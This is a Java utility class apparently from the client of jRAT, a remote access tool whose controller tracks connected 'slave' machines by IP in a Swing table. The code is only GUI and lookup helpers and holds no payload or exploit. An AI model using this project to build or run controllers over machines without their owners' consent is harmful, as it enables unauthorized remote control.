package io.jrat.client.utils;

import io.jrat.client.AbstractSlave;
import io.jrat.client.Main;
import io.jrat.client.ui.frames.Frame;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.File;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;


public class Utils {

	public static HashMap<String, ImageIcon> pingicons = new HashMap<String, ImageIcon>();

	// public static IP2Country ip2c;

	public static int getRow(int column, String value) {
		for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
			if (Frame.mainModel.getValueAt(i, column).equals(value)) {
				return i;
			}
		}
		return -1;
	}

	public static AbstractSlave getSlave(String ip) {
		for (int i = 0; i < Main.connections.size(); i++) {
			if (Main.connections.get(i).getIP().equals(ip)) {
				return Main.connections.get(i);
			}
		}
		return null;
	}

	public static List<AbstractSlave> getSlaves() {
		try {
			List<AbstractSlave> list = new ArrayList<AbstractSlave>();
			for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
				AbstractSlave slave = getSlave(Frame.mainModel.getValueAt(i, 3).toString());
				boolean selected = false;
				for (int row : Frame.mainTable.getSelectedRows()) {
					if (row == i) {
						selected = true;
						break;
					}
				}
				if (slave.isSelected() || selected) {
					list.add(slave);
				}
			}
			return list;
		} catch (Exception ex) {
			ex.printStackTrace();
			return null;
		}
	}

	public static String showDialog(String title, String text) {
		return JOptionPane.showInputDialog(null, text, title, JOptionPane.QUESTION_MESSAGE);
	}

	public static boolean yesNo(String title, String message) {
		return JOptionPane.showConfirmDialog(null, message, title, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION;
	}

	public static String[] getFiles(int[] rows, DefaultTableModel model) {
		String[] str = new String[rows.length];
		for (int i = 0; i < rows.length; i++) {
			int row = rows[i];
			str[i] = model.getValueAt(row, 0).toString();
		}
		return str;
	}

	public static int getRow(AbstractSlave slave) {
		for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
			if (Frame.mainModel.getValueAt(i, 3).equals(slave.getIP())) {
				return i;
			}
		}
		return -1;
	}

	public static void center(JFrame window) {
		int widthWindow = window.getWidth();
		int heightWindow = window.getHeight();
		Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
		int X = (screen.width / 2) - (widthWindow / 2);
		int Y = (screen.height / 2) - (heightWindow / 2);

		window.setBounds(X, Y, widthWindow, heightWindow);
	}

	public static String getDate() {
		Date now = new Date();
		return DateFormat.getTimeInstance(DateFormat.MEDIUM).format(now);
	}

	public static File getWorkingDir() {
		return new File(System.getProperty("user.dir"));
	}

}
